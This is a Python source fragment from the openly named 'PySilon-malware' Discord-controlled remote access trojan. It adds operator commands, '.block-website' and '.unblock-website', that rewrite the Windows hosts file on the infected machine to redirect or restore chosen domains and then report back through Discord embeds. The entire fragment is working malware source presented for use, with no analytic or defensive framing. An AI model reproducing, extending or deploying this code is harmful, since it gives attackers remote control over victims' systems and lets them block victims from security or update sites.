import ctypes
from urllib.parse import urlparse
# end of imports

# anywhere
def get_hosts_file_path():
    hosts_file_path = r'C:\Windows\System32\drivers\etc\hosts'

    if ctypes.windll.kernel32.GetFileAttributesW(hosts_file_path) != -1:
        return hosts_file_path

    return None

# on message
elif message.content[:14] == '.block-website':
    await message.delete()
    if message.content.strip() == '.block-website':
        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .block-website <https://example.com>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
    else:
        website = message.content[15:]
        await message.channel.send(website)

        parsed_url = urlparse(website)
        host_entry = f"127.0.0.1 {parsed_url.netloc}\n"
        hosts_file_path = get_hosts_file_path()

        if hosts_file_path:
            with open(hosts_file_path, 'a') as hosts_file:
                hosts_file.write(host_entry)
            embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been blocked. Unblock it by using .webunblock [websitename]```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)

        else:
            embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)

elif message.content[:16] == '.unblock-website':
    await message.delete()
    if message.content.strip() == '.unblock-website':
        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .unblock-website <example.com>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
    else:
        website = message.content[17:]

        website = website.replace("https://", "")
        website = website.replace("http://", "")

        hosts_file_path = get_hosts_file_path()

        if hosts_file_path:
            with open(hosts_file_path, 'r') as hosts_file:
                lines = hosts_file.readlines()

            filtered_lines = [line for line in lines if website not in line]

            with open(hosts_file_path, 'w') as hosts_file:
                hosts_file.writelines(filtered_lines)

            embed = discord.Embed(title=f"🟢 Success", description=f'```Website {website} has been unblocked.```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)

        else:
            embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await message.channel.send(embed=embed)
